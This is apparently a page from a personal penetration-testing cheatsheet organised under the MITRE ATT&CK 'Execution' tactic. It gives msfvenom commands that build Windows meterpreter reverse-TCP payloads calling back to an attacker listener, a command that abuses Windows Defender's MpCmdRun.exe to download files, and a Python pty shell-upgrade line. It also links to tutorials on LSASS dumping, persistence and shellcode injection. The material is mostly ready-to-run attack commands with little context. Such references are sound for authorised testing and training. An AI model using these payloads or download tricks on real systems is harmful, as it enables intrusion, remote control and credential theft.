---
layout: post
title: TA0002 Execution
category: pen
parent: cheatsheets
modified_date: 2023-07-16
permalink: /pen/win/exec
---

**Mitre Att&ck Entreprise**: [TA0002 - Execution](https://attack.mitre.org/tactics/TA0002/)

**Menu**
<!-- vscode-markdown-toc -->
* [payload](#payload)
	* [pbuild](#pbuild)
	* [psign](#psign)
	* [sources](#sources)
* [dl](#dl)
* [rshell](#rshell)
* [escalation](#escalation)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='payload'></a>payload
### <a name='pbuild'></a>pbuild
pbuild = payload build
```sh
#? generate msfvenom payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f exe > /tmp/meter-rtcp-192.168.156.1-80.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f dll > /tmp/meter-rtcp-192.168.156.1-80.dll
```

### <a name='psign'></a>psign
psign = payload sign

### <a name='sources'></a>sources

*[cocomelonc/registry-run-keys](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)
*[cocomelonc/dump-lsass](https://cocomelonc.github.io/malware/2023/05/11/malware-tricks-28.html)
*[cocomelonc/run-shellcode-via-settimer](https://cocomelonc.github.io/malware/2023/06/04/malware-tricks-31.html)
*[ired.team/write-shellcode-c](https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c)
*[codeproject/write-shellcode-c++](https://www.codeproject.com/Articles/5304605/Creating-Shellcode-from-any-Code-Using-Visual-Stud)
*[byt3bl33d3r/OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim)

## <a name='dl'></a>dl
dl = download
* [/sys/powershell#transfer-http](/sys/powershell/transfer-http)
* [/dev/snippet#python-dl](/dev/snippet#python-dl)
* [juggernaut-sec](https://juggernaut-sec.com/windows-file-transfers-for-hackers/)
```sh
# download
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe -url <url> -path <local-path>
```

## <a name='rshell'></a>rshell
[database](https://shell-storm.org/shellcode/index.html)
```sh
# run bash via python
python -c 'import pty; pty.spawn("/bin/bash")'
```

## <a name='escalation'></a>escalation

[PrivescCheck.ps1](https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1)